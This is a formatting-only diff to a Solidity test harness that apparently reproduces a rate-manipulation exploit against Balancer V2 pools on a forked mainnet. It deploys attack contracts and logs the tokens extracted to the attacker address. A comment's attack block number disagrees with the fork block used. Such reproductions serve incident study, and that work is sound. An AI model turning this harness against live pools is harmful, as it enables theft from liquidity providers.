@@ -82,7 +82,7 @@ contract Exploit_Balancer_V2_Pools is TestHarness, TokenBalanceTracker {
     function setUp() external {
         // Fork mainnet at block before attack
         // Attack happened around block 21,345,000 (Nov 3, 2025)
-        cheat.createSelectFork(vm.envString("RPC_URL"), 23717396);
+        cheat.createSelectFork(vm.envString("RPC_URL"), 23_717_396);
 
         // Set up BPT tokens
         osETH_WETH_BPT = IERC20(POOL_OSETH_WETH);
@@ -92,8 +92,8 @@ contract Exploit_Balancer_V2_Pools is TestHarness, TokenBalanceTracker {
         addTokenToTracker(address(WETH));
         addTokenToTracker(address(osETH));
         addTokenToTracker(address(wstETH));
-        addTokenToTracker(POOL_OSETH_WETH);   // osETH/WETH BPT
-        addTokenToTracker(POOL_WSTETH_WETH);  // wstETH/WETH BPT
+        addTokenToTracker(POOL_OSETH_WETH); // osETH/WETH BPT
+        addTokenToTracker(POOL_WSTETH_WETH); // wstETH/WETH BPT
 
         console.log("=== Balancer V2 Rate Manipulation Attack Reproduction ===");
         console.log("Block:", block.number);
@@ -109,11 +109,7 @@ contract Exploit_Balancer_V2_Pools is TestHarness, TokenBalanceTracker {
         logPoolState("wstETH/WETH Pool", POOL_WSTETH_WETH);
 
         console.log("------- DEPLOYING ATTACK CONTRACTS -------");
-        coordinator = new AttackCoordinator(
-            address(vault),
-            POOL_OSETH_WETH,
-            POOL_WSTETH_WETH
-        );
+        coordinator = new AttackCoordinator(address(vault), POOL_OSETH_WETH, POOL_WSTETH_WETH);
         console.log("Coordinator deployed at:", address(coordinator));
         console.log("ExploitMath deployed at:", address(coordinator.exploitMath()));
         console.log("");
@@ -149,8 +145,8 @@ contract Exploit_Balancer_V2_Pools is TestHarness, TokenBalanceTracker {
         logPoolState("wstETH/WETH Pool", POOL_WSTETH_WETH);
 
         // Calculate rate manipulation
-        uint256 osETHPoolRateBefore = 1027347674695370742;  // From traces
-        uint256 wstETHPoolRateBefore = 1051822276543189290; // From traces
+        uint256 osETHPoolRateBefore = 1_027_347_674_695_370_742; // From traces
+        uint256 wstETHPoolRateBefore = 1_051_822_276_543_189_290; // From traces
 
         uint256 osETHPoolRateAfter = IBalancerPool(POOL_OSETH_WETH).getRate();
         uint256 wstETHPoolRateAfter = IBalancerPool(POOL_WSTETH_WETH).getRate();
@@ -176,10 +172,18 @@ contract Exploit_Balancer_V2_Pools is TestHarness, TokenBalanceTracker {
         uint256 extractedBPT2 = wstETH_WETH_BPT.balanceOf(ATTACKER_EOA);
 
         if (extractedWETH > 0) console.log("  WETH: %s (%s ETH)", extractedWETH, extractedWETH / 1e18);
-        if (extractedOsETH > 0) console.log("  osETH: %s (%s tokens)", extractedOsETH, extractedOsETH / 1e18);
-        if (extractedWstETH > 0) console.log("  wstETH: %s (%s tokens)", extractedWstETH, extractedWstETH / 1e18);
-        if (extractedBPT1 > 0) console.log("  osETH/WETH-BPT: %s (%s tokens)", extractedBPT1, extractedBPT1 / 1e18);
-        if (extractedBPT2 > 0) console.log("  wstETH/WETH-BPT: %s (%s tokens)", extractedBPT2, extractedBPT2 / 1e18);
+        if (extractedOsETH > 0) {
+            console.log("  osETH: %s (%s tokens)", extractedOsETH, extractedOsETH / 1e18);
+        }
+        if (extractedWstETH > 0) {
+            console.log("  wstETH: %s (%s tokens)", extractedWstETH, extractedWstETH / 1e18);
+        }
+        if (extractedBPT1 > 0) {
+            console.log("  osETH/WETH-BPT: %s (%s tokens)", extractedBPT1, extractedBPT1 / 1e18);
+        }
+        if (extractedBPT2 > 0) {
+            console.log("  wstETH/WETH-BPT: %s (%s tokens)", extractedBPT2, extractedBPT2 / 1e18);
+        }
 
         console.log("\n------- ATTACK COMPLETE -------");
     }
@@ -193,7 +197,7 @@ contract Exploit_Balancer_V2_Pools is TestHarness, TokenBalanceTracker {
         cheat.deal(address(coordinator), 100 ether);
 
         // For tokens, use writeTokenBalance
-        writeTokenBalance(address(coordinator), address(WETH), 10000 ether);
+        writeTokenBalance(address(coordinator), address(WETH), 10_000 ether);
         writeTokenBalance(address(coordinator), address(osETH), 1000 ether);
         writeTokenBalance(address(coordinator), address(wstETH), 1000 ether);
 
